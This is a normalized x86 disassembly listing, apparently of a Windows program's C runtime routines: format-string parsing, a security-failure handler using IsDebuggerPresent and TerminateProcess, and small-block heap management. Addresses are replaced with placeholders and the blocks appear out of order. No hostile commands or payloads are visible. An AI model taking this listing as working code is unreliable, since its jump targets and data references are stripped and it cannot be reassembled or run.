add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
je r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x24 ]
dec ecx
cmp [ eax ] si
je r-xdata
sub eax [ ebp - 0x24 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x44 ] 0x0
mov eax [ ebp - 0x28 ]
je r-xdata
test [ ebp - 0x18 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x38 ] 0x2b
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x20 ] 0xa3
jle r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
cmp [ ebp - 0x19 ] 0x67
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
test [ ebp - 0x18 ] 0x20
je r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x44 ] esi
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x14 ] al
mov [ ebp - 0x28 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_41b862
add esp 0x10
test eax eax
je r-xdata
mov [ ebp - 0x74 ] esi
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
call sub_417613
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x34 ]
call sub_4175ef
add esp 0xc
mov [ ebp - 0x38 ] 0x20
mov esi [ ebp - 0x20 ]
add esi 0x15d
push esi
call sub_417499
test eax eax
mov dl [ ebp - 0x19 ]
pop ecx
mov [ ebp - 0x54 ] eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp edi esi
jne r-xdata
lea eax [ ebp - 0x64 ]
push eax
push ebx
push [ rw-data ]
call sub_415561
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x34 ]
mov [ esi ] eax
mov ax [ ebp - 0x34 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x18 ] 0x200
jmp r-xdata
lea esi [ ebp + 0x1eb ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
test [ ebp - 0x18 ] 0x4
je r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x20 ] 0xa3
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x68 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x100
inc ebx
mov [ ebp - 0x24 ] ebx
lea eax [ ebp - 0x64 ]
push eax
push ebx
push [ rw-data ]
call sub_415561
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x28 ]
cdq
push edx
push eax
push ebx
push edi
call sub_41b8d0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x68 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x34 ]
call sub_4175ef
add esp 0xc
or [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x70 ] eax
je r-xdata
xor esi esi
call sub_4108e0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x4c ]
lea eax [ ebp + 0x1eb ]
sub eax esi
inc esi
test [ ebp - 0x18 ] 0x200
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jl r-xdata
push [ ebp - 0x70 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp + 0x1ec ]
call sub_417613
cmp [ ebp - 0x68 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x20 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x68 ]
push eax
push 0x6
lea eax [ ebp + 0x1ec ]
push eax
lea eax [ ebp - 0x70 ]
inc esi
push eax
inc esi
call sub_41b862
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x24 ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_413eb1
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_4109d0
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_40f589
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_41ac5d
pop ecx
sub_413fad
push ebp
mov ebp esp
push [ rw-data ]
call sub_415561
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_41ac5d
pop ecx
pop ebp
jmp sub_413eb1
pop ebp
jmp eax
sub_413fd1
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
call sub_413016
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_41304d
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
cmp [ ebp - 0x4 ] 0x2
pop esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
push 0x3
pop eax
leave
retn
cmp [ ebp - 0x8 ] 0x5
jb r-xdata
xor eax eax
inc eax
leave
retn
sub_41402c
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call sub_413fd1
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
push 0x3f8
call sub_41422d
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_414086
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_41ab5c
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_4140cf
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_40f613
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_414139
push 0xc
push r--data
call sub_4106dc
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_414ef8
push 0x1e
call sub_414d58
push 0xff
call sub_412fb7
push 0x18
call sub_417499
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_411077
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_410721
retn
push edi
call sub_40f613
pop ecx
push 0xfa0
push edi
call sub_41ab5c
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40f613
pop ecx
call sub_411077
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4141f3
mov eax [ ebp - 0x1c ]
sub_4141fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_414139
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_412f6d
pop ecx
sub_41422d
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_414275
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_4142a0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_418250
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4145b4
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_414664
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_41476a
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_414a49
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
